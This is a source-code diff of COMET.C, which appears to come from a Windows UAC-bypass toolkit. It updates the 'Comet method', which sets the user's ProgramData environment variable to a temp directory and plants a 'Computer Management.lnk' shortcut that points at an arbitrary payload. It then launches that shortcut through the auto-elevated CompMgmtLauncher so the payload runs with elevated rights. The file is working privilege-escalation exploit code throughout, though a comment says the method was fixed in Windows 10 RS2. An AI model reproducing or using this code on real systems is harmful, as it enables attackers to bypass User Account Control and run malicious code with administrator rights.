@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2016 - 2017
+*  (C) COPYRIGHT AUTHORS, 2016 - 2018
 *
 *  TITLE:       COMET.C
 *
-*  VERSION:     2.70
+*  VERSION:     3.11
 *
-*  DATE:        25 Mar 2017
+*  DATE:        23 Nov 2018
 *
 *  Comet method (c) BreakingMalware
 *  For description please visit original URL 
@@ -23,55 +23,6 @@
 #include <ShObjIdl.h>
 
 /*
-* ucmSetEnvVariable
-*
-* Purpose:
-*
-* Remove or set current user environment variable.
-*
-*/
-BOOL ucmSetEnvVariable(
-    _In_ BOOL fRemove,
-    _In_ LPWSTR lpVariableName,
-    _In_opt_ LPWSTR lpVariableData
-)
-{
-    BOOL	bResult = FALSE, bCond = FALSE;
-    HKEY    hKey = NULL;
-    DWORD   cbData;
-
-    do {
-        if (lpVariableName == NULL)
-            break;
-
-        if ((lpVariableData == NULL) && (fRemove == FALSE))
-            break;
-
-        if (RegOpenKey(HKEY_CURRENT_USER, L"Environment", &hKey) != ERROR_SUCCESS)
-            break;
-
-        if (fRemove) {
-            RegDeleteValue(hKey, lpVariableName);
-        }
-        else {
-            cbData = (DWORD)((1 + _strlen(lpVariableData)) * sizeof(WCHAR));
-            if (RegSetValueEx(hKey, lpVariableName, 0, REG_SZ, 
-                (BYTE*)lpVariableData, cbData) != ERROR_SUCCESS)
-            {
-                break;
-            }
-        }
-        bResult = TRUE;
-
-    } while (bCond);
-
-    if (hKey != NULL)
-        RegCloseKey(hKey);
-
-    return bResult;
-}
-
-/*
 * ucmCometMethod
 *
 * Purpose:
@@ -79,6 +30,8 @@ BOOL ucmSetEnvVariable(
 * Fool autoelevated application with help of manipulation of the current user environment variables.
 * CompMgmtLauncher.exe is a moronic .LNK ShellExecute launcher application.
 * Only MS do system trusted applications which only purpose is to LAUNCH .LNK files.
+*
+* Fixed in Windows 10 RS2
 *
 */
 BOOL ucmCometMethod(
@@ -89,20 +42,18 @@ BOOL ucmCometMethod(
     PVOID   OldValue = NULL;
 #endif
 
+    HRESULT hr_init;
+
     BOOL    bCond = FALSE, bResult = FALSE;
     WCHAR   szCombinedPath[MAX_PATH * 2], szLinkFile[MAX_PATH * 3];
-    HRESULT hResult;
 
     IPersistFile    *persistFile = NULL;
     IShellLink      *newLink = NULL;
-    
+
     SHELLEXECUTEINFO  shinfo;
 
-    if (lpszPayload == NULL)
-        return FALSE;
-
 #ifndef _WIN64
-    if (g_ctx.IsWow64) {
+    if (g_ctx->IsWow64) {
         if (!NT_SUCCESS(RtlWow64EnableFsRedirectionEx((PVOID)TRUE, &OldValue)))
             return FALSE;
     }
@@ -111,8 +62,8 @@ BOOL ucmCometMethod(
     do {
 
         RtlSecureZeroMemory(szCombinedPath, sizeof(szCombinedPath));
-        _strcpy(szCombinedPath, g_ctx.szTempDirectory);
-        _strcat(szCombinedPath, L"huy32");
+        _strcpy(szCombinedPath, g_ctx->szTempDirectory);
+        _strcat(szCombinedPath, SOMEOTHERNAME);
         if (!CreateDirectory(szCombinedPath, NULL)) {//%temp%\Comet
             if (GetLastError() != ERROR_ALREADY_EXISTS)
                 break;
@@ -125,7 +76,7 @@ BOOL ucmCometMethod(
                 break;
         }
 
-        if (!ucmSetEnvVariable(FALSE, T_PROGRAMDATA, szCombinedPath))
+        if (!supSetEnvVariable(FALSE, NULL, T_PROGRAMDATA, szCombinedPath))
             break;
 
         _strcat(szCombinedPath, TEXT("\\Microsoft"));
@@ -158,51 +109,50 @@ BOOL ucmCometMethod(
                 break;
         }
 
-        hResult = CoInitialize(NULL);
-        if (SUCCEEDED(hResult)) {
-            hResult = CoCreateInstance(&CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, &IID_IShellLink, (LPVOID *)&newLink);
-            if (SUCCEEDED(hResult)) {
-                newLink->lpVtbl->SetPath(newLink, lpszPayload);
-                newLink->lpVtbl->SetArguments(newLink, L"");
-                newLink->lpVtbl->SetDescription(newLink, L"Comet method");
-                hResult = newLink->lpVtbl->QueryInterface(newLink, &IID_IPersistFile, (void **)&persistFile);
-                if (SUCCEEDED(hResult)) {
+        hr_init = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
+        if (SUCCEEDED(CoCreateInstance(&CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, &IID_IShellLink, (LPVOID *)&newLink))) {
+            newLink->lpVtbl->SetPath(newLink, lpszPayload);
+            newLink->lpVtbl->SetArguments(newLink, L"");
+            newLink->lpVtbl->SetDescription(newLink, L"Comet method");
+            if (SUCCEEDED(newLink->lpVtbl->QueryInterface(newLink, &IID_IPersistFile, (void **)&persistFile))) {
+                _strcpy(szLinkFile, szCombinedPath);
+                _strcat(szLinkFile, L"\\Computer Management.lnk");
+                if (SUCCEEDED(persistFile->lpVtbl->Save(persistFile, szLinkFile, TRUE))) {
+                    persistFile->lpVtbl->Release(persistFile);
+
+                    _strcpy(szCombinedPath, g_ctx->szTempDirectory);
+                    _strcat(szCombinedPath, SOMEOTHERNAME);
                     _strcpy(szLinkFile, szCombinedPath);
-                    _strcat(szLinkFile, L"\\Computer Management.lnk");
-                    if (SUCCEEDED(persistFile->lpVtbl->Save(persistFile, szLinkFile, TRUE))) {
-                        persistFile->lpVtbl->Release(persistFile);
+                    _strcat(szLinkFile, T_CLSID_MYCOMPUTER_COMET);
 
-                        _strcpy(szCombinedPath, g_ctx.szTempDirectory);
-                        _strcat(szCombinedPath, L"huy32");
-                        _strcpy(szLinkFile, szCombinedPath);
-                        _strcat(szLinkFile, T_CLSID_MYCOMPUTER_COMET);
-
-                        RtlSecureZeroMemory(&shinfo, sizeof(shinfo));
-                        shinfo.cbSize = sizeof(shinfo);
-                        shinfo.fMask = SEE_MASK_NOCLOSEPROCESS;
-                        shinfo.lpFile = szLinkFile;
-                        shinfo.lpParameters = L"";
-                        shinfo.lpVerb = MANAGE_VERB;
-                        shinfo.lpDirectory = szCombinedPath;
-                        shinfo.nShow = SW_SHOW;
-                        if (ShellExecuteEx(&shinfo)) {
-                            CloseHandle(shinfo.hProcess);
-                            bResult = TRUE;
-                        }
+                    RtlSecureZeroMemory(&shinfo, sizeof(shinfo));
+                    shinfo.cbSize = sizeof(shinfo);
+                    shinfo.fMask = SEE_MASK_NOCLOSEPROCESS;
+                    shinfo.lpFile = szLinkFile;
+                    shinfo.lpParameters = L"";
+                    shinfo.lpVerb = MANAGE_VERB;
+                    shinfo.lpDirectory = szCombinedPath;
+                    shinfo.nShow = SW_SHOW;
+                    if (ShellExecuteEx(&shinfo)) {
+                        CloseHandle(shinfo.hProcess);
+                        bResult = TRUE;
                     }
                 }
-                newLink->lpVtbl->Release(newLink);
             }
+            newLink->lpVtbl->Release(newLink);
         }
+
+        if (hr_init == S_OK)
+            CoUninitialize();
 
     } while (bCond);
 
 #ifndef _WIN64
-    if (g_ctx.IsWow64) {
+    if (g_ctx->IsWow64) {
         RtlWow64EnableFsRedirectionEx(OldValue, &OldValue);
     }
 #endif
 
-    ucmSetEnvVariable(TRUE, T_PROGRAMDATA, NULL);
+    supSetEnvVariable(TRUE, NULL, T_PROGRAMDATA, NULL);
     return bResult;
 }
